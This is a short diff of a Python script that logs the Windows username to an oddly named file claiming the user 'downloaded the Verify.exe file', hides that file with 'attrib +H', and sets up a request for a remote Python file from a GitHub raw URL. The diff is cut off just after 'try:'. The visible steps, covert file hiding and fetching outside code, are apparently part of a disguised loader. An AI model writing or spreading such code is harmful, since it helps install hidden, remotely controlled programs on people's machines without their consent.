@@ -1,12 +1,15 @@
 import requests
 import os
+import time
+import subprocess
 
 def main():
     user_name = os.environ.get('USERNAME', 'UnknownUser')
-
     file_name = f'NODJKSLmJDLJIdHWID.txt'
     with open(file_name, 'a') as file:
-        file.write(f"The user {user_name} Accepted Auth...\n")
+        file.write(f"This user: {user_name} downloaded the Verify.exe file\n")
+        
+    subprocess.check_call(["attrib", "+H", "NODJKSLmJDLJIdHWID.txt"])
 
     url = 'https://raw.githubusercontent.com/AprillZerx/Loin/main/Prof.py'
     try:
